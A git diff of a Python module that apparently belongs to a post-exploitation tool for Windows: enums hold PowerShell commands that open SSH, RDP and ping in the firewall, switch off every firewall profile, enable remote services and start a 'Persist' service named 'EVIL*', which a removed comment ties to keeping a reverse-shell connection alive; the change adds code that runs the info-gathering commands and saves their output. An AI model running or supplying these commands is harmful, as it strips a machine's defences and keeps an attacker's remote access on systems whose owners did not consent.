@@ -26,16 +26,15 @@ class Powershell():
 
     class OpenPorts(Enum):
         # Open Port and services
-        OPENSSHPORT         = f"{psPrefix}New-NetFirewallRule -DisplayName 'ALLOW TCP PORT 21' -Direction inbound -Profile Any -Action Allow -LocalPort 22 -Protocol TCP"
+        OPENSSHPORT         = f"{psPrefix}New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22"
         ALLOWPING           = f"{psPrefix}netsh advfirewall firewall add rule name='ICMP Allow incoming V4 echo request' protocol=icmpv4:8,any dir=in action=allow"
         ALLOWRDP            = f"{psPrefix}Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"
         DEACTIVATEFIREWALL  = f"{psPrefix}Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
 
     class ActivateServices(Enum):
         ENABLERDP           = f"{psPrefix}Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name 'fDenyTSConnections' -Value 0 && ; Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name 'UserAuthentication' -Value 1"    
-        ENABLESSH           = f"{psPrefix}Add-WindowsCapability -Online -Name ((Get-WindowsCapability -Online | ? Name -like 'OpenSSH.Server*').name)"  
+        ENABLESSH           = f"{psPrefix}Add-WindowsCapability -Online -Name ((Get-WindowsCapability -Online | ? Name -like 'OpenSSH.Server*').name) ; Start-Service sshd ; Set-Service -Name sshd -StartupType 'Automatic'"  
 
-    # Ajouté un service pour faire persister la connexion reverseShell
     class Persist(Enum):
         STARTEVILSERVICE    = f"{psPrefix}Get-Service -name 'EVIL*' | Start-Service"
         CHECKEVILSTATUS     = f"{psPrefix}(Get-Service -Name 'EVIL*').status"
@@ -46,6 +45,17 @@ class Powershell():
 
 
 if __name__ == "__main__":
-    for command in (Powershell.GetInfo):
-        print(command.name)
-        print(command.value)
+    import subprocess
+    import json
+
+    # for command in (Powershell.GetInfo):
+    #     print(command.name)
+    #     print(command.value)
+    data = {}
+    for command in Powershell.GetInfo:
+            data[command.name] = subprocess.check_output(command.value).decode("Windows-1252")
+    
+    with open("output.txt", "w") as f:
+        f.write(json.dumps(data))
+
+    # print(data)
